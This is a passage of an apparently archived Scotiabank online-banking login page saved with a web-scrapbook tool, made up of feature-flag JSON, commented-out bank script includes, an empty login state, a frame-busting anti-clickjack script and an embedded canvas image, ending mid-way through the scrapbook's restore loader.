iation":1},"dc-campaigns.onboardings.customers":{"version":3,"variation":1},"dc-campaigns.onboardings.customers.applications":{"version":3,"variation":1},"dc-credentials.customers.political_exposure":{"version":3,"variation":1},"dc-credentials.customers.risks":{"version":3,"variation":1},"dc-credentials.customers_employment":{"version":4,"variation":1},"dc-credentials.profiles.publish_event":{"version":2,"variation":1},"dc-svcs-auth.change_password.events":{"version":2,"variation":1},"dc-svcs-auth.login.events":{"version":2,"variation":1},"dc-svcs-auth.monitor_plus":{"version":2,"variation":1},"dc-svcs-auth.off_boarding_date":{"version":3,"variation":1},"dc-svcs-auth.recover_username.events":{"version":2,"variation":1},"dc-svcs-auth.reset_password.events":{"version":3,"variation":1},"dc-svcs-auth.username_intercept.interval":{"version":13,"variation":0},"dc-svcs-auth.v3_digital_access.governmentdb":{"version":2,"variation":1},"dc-svcs-auth.v3_digital_access.idv":{"version":3,"variation":1},"dc-svcs-auth.v3_hrt_pay_submit":{"version":3,"variation":0},"dc-svcs-auth.v3_hrt_tpt_add_recipient":{"version":3,"variation":0},"dc-svcs-auth.v3_hrt_tpt_edit_recipient":{"version":2,"variation":1},"dc-svcs-auth.v3_hrt_tpt_submit":{"version":3,"variation":0},"dc-transfers.bill_payments":{"version":3,"variation":0},"dc-transfers.bill_payments_fraud_detection":{"version":4,"variation":0},"dc-transfers.customer_initiated_entry":{"version":5,"variation":1},"dc-transfers.merchants":{"version":4,"variation":1},"dc-transfers.mobile_top_ups":{"version":3,"variation":0},"dc-transfers.mobile_top_ups_fraud_detection":{"version":3,"variation":0},"dc-transfers.payees":{"version":4,"variation":0},"dc-transfers.tax_payments":{"version":3,"variation":0},"dc-transfers.tax_payments_fraud_detection":{"version":3,"variation":1},"dc-transfers.third_party_transfers":{"version":3,"variation":0},"dc-transfers.third_party_transfers_ach":{"version":6,"variation":0},"dc-transfers.third_party_transfers_fraud_detection":{"version":4,"variation":0},"dc-transfers.third_party_transfers_instantpayment_bh":{"version":3,"variation":0},"dc-transfers.third_party_transfers_instantpayment_local":{"version":3,"variation":0},"dc-transfers.third_party_transfers_instantpayment_sipa":{"version":3,"variation":0},"dc-transfers.third_party_transfers_offus":{"version":2,"variation":1},"dc-transfers.third_party_transfers_onus":{"version":3,"variation":0},"dc-transfers.third_party_transfers_rtp":{"version":4,"variation":1},"dc-transfers.third_party_transfers_rtp_fraud_detection":{"version":4,"variation":1},"dcsvcs-auth.username_intercept.interval":{"version":4,"variation":1},"dcsvcs.auth.username_intercept.interval":{"version":2,"variation":1},"leap.onyx_redirect":{"version":31,"variation":0},"leap.token_info_check.interval":{"version":4,"variation":4},"web.online.all.auth.login":{"version":9,"variation":0},"web.online.all.auth.login_welcome_modal":{"version":4,"variation":0},"web.online.all.auth.recover_username":{"version":7,"variation":0},"web.online.all.auth.reset_password":{"version":7,"variation":0},"web.online.all.auth.self_enrollment":{"version":7,"variation":0},"web.online.all.breeze.address_update":{"version":2,"variation":1},"web.online.all.breeze.campaigns":{"version":2,"variation":1},"web.online.all.breeze.dashboard_campaign":{"version":2,"variation":1},"web.online.all.breeze.dashboard_recent_transactions":{"version":2,"variation":1},"web.online.all.breeze.leap_navigation":{"version":3,"variation":1},"web.online.all.breeze.navigation_to_leap":{"version":2,"variation":1}},"$valid":true}};
         window.savedUsers=[];
         window.isUserFirstTime=false;
      </script>
      <script type="text/javascript" src="https://auth.online.scotiabank.com/resource-loader.js"></script>
      <script type="text/javascript" src="https://auth.online.scotiabank.com/buttonCss/buttonCss.js"></script>
       -->
	  <canvas data-scrapbook-canvas="data:image/png;base64,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IALXQSBCrEiYroPjrxZlgoUf2ogAEbg+AiRU18dPWGkSK2GcyIoIEAERECDBEkEQyAUiQASEESDBEsaJrIgAERABARIsEQSBXCACREAYARIsYZzIiggQAREQIMESQRDIBSJABIQRIMESxomsiAAREAEBEiwRBIFcIAJEQBgBEixhnMiKCGu4FlYAAAU6SURBVBABERAgwRJBEMgFIkAEhBEgwRLGiayIABEQAQESLBEEgVwgAkRAGAESLGGcyIoIEAERECDBEkEQyAUiQASEESDBEsaJrIgAERABARIsEQSBXCACREAYARIsYZzIiggQAREQIMESQRDIBSJABIQRIMESxomsiAAREAEBEiwRBIFcIAJEQBgBEixhnMiKCBABERAgwRJBEMgFIkAEhBEgwRLGiayIABEQAQESLBEEgVwgAkRAGAESLGGcyIoIEAERECDBEkEQyAUiQASEESDBEsaJrIgAERABARIsEQSBXCACREAYARIsYZzIiggQAREQIMESQRDIBSJABIQRIMESxomsiAAREAEBEiwRBIFcIAJEQBgBEixhnMiKCBABERAgwRJBEMgFIkAEhBEgwRLGiayIABEQAQESLBEEgVwgAkRAGAESLGGcyIoIEAERECDBEkEQyAUiQASEESDBEsaJrIgAERABARIsEQSBXCACREAYARIsYZzIiggQAREQIMESQRDIBSJABIQRIMESxomsiAAREAEBEiwRBIFcIAJEQBgBEixhnMiKCBABERAgwRJBEMgFIkAEhBEgwRLGiayIABEQAQESLBEEgVwgAkRAGAESLGGcyIoIEAERECDBEkEQyAUiQASEESDBEsaJrIgAERABARIsEQSBXCACREAYARIsYZzIiggQAREQIMESQRDIBSJABIQRIMESxomsiAAREAEBEiwRBIFcIAJEQBgBEixhnMiKCBABERAgwRJBEMgFIkAEhBEgwRLGiayIABEQAQESLBEEgVwgAkRAGAESLGGcyIoIEAERECDBEkEQyAUiQASEESDBEsaJrIgAERABARIsEQSBXCACREAYARIsYZzIiggQAREQIMESQRDIBSJABIQRIMESxomsiAAREAEBEiwRBIFcIAJEQBgBEixhnMiKCBABERAgwRJBEMgFIkAEhBEgwRLGiayIABEQAQESLBEEgVwgAkRAGAESLGGcyIoIEAERECDBEkEQyAUiQASEESDBEsaJrIgAERABARIsEQSBXCACREAYARIsYZzIiggQAREQIMESQRDIBSJABIQRIMESxomsiAAREAEBEiwRBIFcIAJEQBgBEixhnMiKCBABERAgwRJBEMgFIkAEhBEgwRLGiayIABEQAQESLBEEgVwgAkRAGAESLGGcyIoIEAERECDBEkEQyAUiQASEESDBEsaJrIgAERABARIsEQSBXCACREAYARIsYZzIiggQAREQIMESQRDIBSJABIQRIMESxomsiAAREAEBEiwRBIFcIAJEQBgBEixhnMiKCBABERAgwRJBEMgFIkAEhBEgwRLGiayIABEQAQESLBEEgVwgAkRAGAESLGGcyIoIEAERECDBEkEQyAUiQASEESDBEsaJrIgAERABARIsEQSBXCACREAYARIsYZzIiggQAREQIMESQRDIBSJABIQRIMESxomsiAAREAEBEiwRBIFcIAJEQBgBEixhnMiKCBABERAgwRJBEMgFIkAEhBEgwRLGiayIABEQAQESLBEEgVwgAkRAGAESLGGcyIoIEAERECDBEkEQyAUiQASEESDBEsaJrIgAERABARIsEQSBXCACREAYARIsYZzIiggQAREQIMESQRDIBSJABIQRIMESxomsiAAREAEBEiwRBIFcIAJEQBgBEixhnMiKCBABERAgwRJBEMgFIkAEhBEgwRLGiayIABEQAQESLBEEgVwgAkRAGAESLGGcyIoIEAERECDBEkEQyAUiQASEEfh/RROheDoqN0QAAAAASUVORK5CYII=" hidden=""></canvas>
      <!--
	  <script type="text/javascript">
         window.REDUX_STATE = {"auth":{"token":"","restrictedScopeToken":""},"common":{"redirect":{"endpoint":"","data":null},"externalRedirectUri":"","currentFlow":"","currentChallenge":{"type":"","challenge":null},"currentAuthResponse":null,"resendCode":{"challenge":null},"loadingState":false,"countryCode":null,"languageCode":null,"rememberMe":false},"error":{"visible":false,"message":"","status":null,"showError":false,"modal":{"visible":false,"title":"","message":""}},"login":{"loginId":{"error":"","touched":false,"value":""},"password":{"error":"","touched":false,"value":"","toggled":false},"qsCode":"","prefEnv":{},"isEncrypted":false,"trustDevice":false,"trustDeviceId":"","sequenceNonce":"","Fingerprint":""},"passport":{"token":"","providerId":"","state":"","locale":"","redirectUri":"","clientId":""},"emailOtp":{"emailOtpGenResult":{},"trustDevice":false},"pushNotification":{"pushNotificationChallenge":{}}}
      </script>
      <script type="text/javascript" src="https://auth.online.scotiabank.com/runtime.344ccab60dc713c20030.js"></script>
      <script type="text/javascript">(window.webpackJsonp=window.webpackJsonp||[]).push([[0],[]]);</script>
      <script type="text/javascript" src="https://auth.online.scotiabank.com/main.d3dc9b4ec8d59d855b41.chunk.js"></script>
      <script type="text/javascript">
         if (self === top) {
             var antiClickjack = document.getElementById("antiClickjack");
             antiClickjack.parentNode.removeChild(antiClickjack);
         } else {
             top.location = self.location;
         }
      </script>
      <script data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s; while (i--) { e = E[i]; if ((d = e.getAttribute(k1)) !== null && !e.shadowRoot && e.attachShadow) { s = e.attachShadow({mode: 'open'}); s.innerHTML = d; e.removeAttribute(k1); } if ((d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; 